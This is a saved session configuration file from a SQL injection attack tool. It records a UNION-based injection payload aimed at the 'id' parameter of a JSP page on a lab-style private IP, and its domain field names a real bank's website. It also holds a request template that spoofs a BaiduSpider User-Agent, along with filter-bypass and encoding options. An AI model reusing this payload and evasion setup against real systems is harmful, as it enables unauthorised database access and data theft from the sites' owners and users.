<?xml version="1.0"?>
<Config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <saveConfigpath>F:\tools\tools\超级SQL注入工具【SSQLInjection】V1.0 正式版 20190319\logs\injection\192.168.189.128\8080\JVApp\mysql.jsp/id_Union.xml</saveConfigpath>
  <time />
  <domain>http://www.abchina.com/cn/</domain>
  <uri>/JVApp/mysql.jsp</uri>
  <pname>id</pname>
  <testPayload> and 1=2 union all select 24379+1,24379+2,24379+3,24379+4#</testPayload>
  <port>80</port>
  <maxTime>0</maxTime>
  <injectType>UnKnow</injectType>
  <dbType>UnKnow</dbType>
  <timeOut>10</timeOut>
  <threadSize>10</threadSize>
  <reTry>2</reTry>
  <encoding>自动识别</encoding>
  <request>GET /JVApp/mysql.jsp?id=1&lt;Encode&gt; and#inject##&lt;/Encode&gt; HTTP/1.1
User-Agent: BaiduSpider
Accept-Encoding: gzip, deflate
Host: 192.168.189.128:8080</request>
  <sencondRequest />
  <key>JVApp</key>
  <injectHTTPCode>200</injectHTTPCode>
  <db_encoding>UTF-8</db_encoding>
  <useCode>false</useCode>
  <columnsCount>4</columnsCount>
  <unionFillTemplate />
  <sencondInject>false</sencondInject>
  <showColumn>2</showColumn>
  <reverseKey>false</reverseKey>
  <keyType>Key</keyType>
  <isMuStr>true</isMuStr>
  <is_foward_302>false</is_foward_302>
  <isOpenInfoLog>true</isOpenInfoLog>
  <isOpenHTTPLog>true</isOpenHTTPLog>
  <isAutoCheckUpdate>true</isAutoCheckUpdate>
  <isSavaConfigWhenClose>true</isSavaConfigWhenClose>
  <useSSL>false</useSSL>
  <isOpenURLEncoding>true</isOpenURLEncoding>
  <redirectDoGet>false</redirectDoGet>
  <maxClolumns>50</maxClolumns>
  <urlencodeCount>1</urlencodeCount>
  <unionFill>1</unionFill>
  <token_request />
  <token_startStr />
  <token_endStr />
  <readFileEncoding>GBK</readFileEncoding>
  <showCmdResult>true</showCmdResult>
  <reaplaceBeforURLEncode>true</reaplaceBeforURLEncode>
  <inculdeStr>false</inculdeStr>
  <keyReplace>0</keyReplace>
  <randIPToHeader />
  <sendHTTPSleepTime>0</sendHTTPSleepTime>
  <replaceStrs />
  <base64Count>0</base64Count>
  <useBetweenByPass>true</useBetweenByPass>
  <usehex>false</usehex>
  <useUnicode>false</useUnicode>
  <level>0</level>
  <linkCount>1</linkCount>
  <maxSpiderCount>10</maxSpiderCount>
  <maxScanCount>10</maxScanCount>
  <proxy_mode>0</proxy_mode>
  <proxy_check_host>www.baidu.com</proxy_check_host>
  <proxy_check_port>80</proxy_check_port>
  <proxy_check_Keys>百度一下，你就知道</proxy_check_Keys>
</Config>